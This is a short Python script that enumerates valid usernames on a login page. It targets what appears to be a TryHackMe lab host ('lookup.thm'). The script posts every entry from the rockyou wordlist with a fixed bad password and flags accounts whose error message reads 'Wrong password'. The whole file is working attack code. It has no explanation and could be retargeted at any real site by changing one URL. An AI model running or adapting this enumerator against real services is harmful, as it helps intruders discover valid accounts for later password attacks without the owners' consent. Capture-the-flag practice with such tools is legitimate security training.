import requests

# === Config ===
URL = "http://lookup.thm/login.php"         # <-- change this to the real URL
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
WORDLIST = "/usr/share/wordlists/rockyou.txt"              # <-- list of usernames to test
INVALID_PASSWORD = "test1234"           # <-- a known bad password
SUCCESS_INDICATOR = "Wrong password"    # <-- string to detect valid usernames

def check_username(username):
    data = {
        USERNAME_FIELD: username.strip(),
        PASSWORD_FIELD: INVALID_PASSWORD
    }
    try:
        response = requests.post(URL, data=data, timeout=5)
    except requests.RequestException as e:
        print(f"[!] Error connecting to server: {e}")
        return None

    if SUCCESS_INDICATOR.lower() in response.text.lower():
        return True  # Username is valid
    return False      # Username not recognized

def main():
    print("[*] Starting username enumeration...\n")
    with open(WORDLIST, "r") as f:
        for line in f:
            username = line.strip()
            if not username:
                continue
            result = check_username(username)
            if result:
                print(f"[+] Valid username found: {username}")
            else:
                print(f"[-] Invalid username: {username}")

if __name__ == "__main__":
    main()
